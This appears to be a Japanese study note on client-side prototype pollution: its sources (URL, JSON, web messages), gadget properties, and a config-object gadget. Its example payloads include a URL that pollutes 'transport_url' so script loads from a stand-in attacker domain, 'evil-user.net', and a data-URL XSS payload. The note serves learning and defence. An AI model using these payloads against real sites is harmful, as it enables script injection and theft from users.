## Prototype pollution sources

- [1. DOM-based vulnの基本と対策(概要)](../../Client-side/DOM-based%20vuln/1.%20DOM-based%20vulnの基本と対策(概要).md#ソース(source))
###### 一般的なSource

- URLのクエリ / フラグメントストリング
- JSON input
- Web messages

#### URLによるPrototype汚染

1. URLに注入する
```
https://example.com/?__proto__[evilProperty]=payload
```
2. 以下のように解釈される
```js
targetObject.__proto__.evilProperty = 'payload';
```
3. これによりprototype chain上階層を汚染できる可能性がある
	- もし`targetObject`の上が`Object.prototype`なら、一致するキー(プロパティ名。ここでは`evilProperty`)を持たないすべてのオブジェクトが注入したプロパティを継承する
	- [JavaScriptとJSON](../../Misc/JavaScriptとJSON.md#prototype%20chain)

- 詳細：[Prototype pollution via the URL](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-via-the-url)

#### JSON inputによるPrototype汚染

1. 例えばWeb messeageを利用して悪意あるJSONを注入する
```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

2. `JSON.parse()`メソッドによってJavaScriptオブジェクトに変換されると、`__proto__`というキー(プロパティ名)をもつプロパティが注入される
```js
//文字列としてそのまま代入された場合
const objectLiteral = {__proto__: {evilProperty: 'payload'}}; 
//JavaScriptオブジェクトに変換されて代入された場合
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```
- `オブジェクト.hasOwnProperty`: prototypeではなくそのオブジェクト自身が指定されたプロパティを持っているかどうかを示す真偽値を返す

3. これによりprototype chain上階層を汚染できる可能性がある

- 詳細：[Prototype pollution via JSON input](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-via-json-input)

- 任意のJavaScriptコードやシステムコマンドを実行可能にするJavaScript関数やDOM要素のこと

	- クライアントサイドのsinkは[0. sinkとsourceのリスト](../../Client-side/DOM-based%20vuln/0.%20sinkとsourceのリスト.md)を参考にする

## Prototype pollution gadgets

- Gadget : Prototype汚染の脆弱性を実際の攻撃に転じるための手段を提供するプロパティのこと

#### Gadgetとなりえるプロパティの条件

- アプリケーションによって安全でない方法で使用されること:
	- 十分なフィルタリングやサニタイズをせずにシンクに渡されてしまうプロパティ。
	- 例えば、ユーザからの入力をそのまま評価する`eval`関数や、HTMLに直接挿入する方法など

- 攻撃者がprototype汚染を介して制御可能なこと:
	- 攻撃者がプロトタイプに悪意あるバージョンのプロパティを追加し、他のオブジェクトがそのプロパティを継承可能な場合。

- 対象のオブジェクト内で定義されていないこと

###### Gadgetになり得ないプロパティ

- オブジェクト自身で定義されているプロパティ
- この場合、prototype汚染テクニックを使用してプロパティを注入しても、もともと定義されているプロパティの値でペイロードが上書きされる
	- 方法は[Preventing an object from inheriting properties](https://portswigger.net/web-security/prototype-pollution/preventing#preventing-an-object-from-inheriting-properties)を参照

#### Prototype汚染のgadget例

- ほとんどのJSライブラリは、開発者が独自の設定をするための`config`オブジェクトがあり、そこに特定のプロパティを追加することで独自の設定が可能
	- ほぼすべてのデータ型はオブジェクトとして振舞う([JavaScriptとJSON](../../Misc/JavaScriptとJSON.md#prototypeとは))

- もし特定のプロパティが追加されなかったら、定義済みのデフォルトオプションが使用される

###### 設定オブジェクトの例

```js
let transport_url = config.transport_url || defaults.transport_url;
```
- `transport_url`：オブジェクト
- `config`：設定用のオブジェクト

- ここで、`transport_url`がスクリプトを参照するために使われているとする
```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```
- `${}`:  [JavaScriptとJSON](../../Misc/JavaScriptとJSON.md#テンプレートリテラルとは)

- このとき、攻撃者の設定した`transport_url`プロパティで`Object.prototype`を汚染できたとする
- このプロパティは`Object.prototype`から`config`オブジェクトに継承されるため、攻撃者が選択したドメインが`script.src`に設定されるよう上書きされる

##### 具体的な攻撃

- クエリパラメタによってprototypeを汚染する
```
https://example.com/?__proto__[transport_url]=//evil-user.net
```

- もしくは[データURL](https://developer.mozilla.org/ja/docs/Web/HTTP/Basics_of_HTTP/Data_URLs)を使ってXSSペイロードを埋め込む
```
https://example.com/?__proto__[transport_url]=data:,alert(1);//
```
	↓
```js
script.src = data:,alert(1);///example.js`;
```
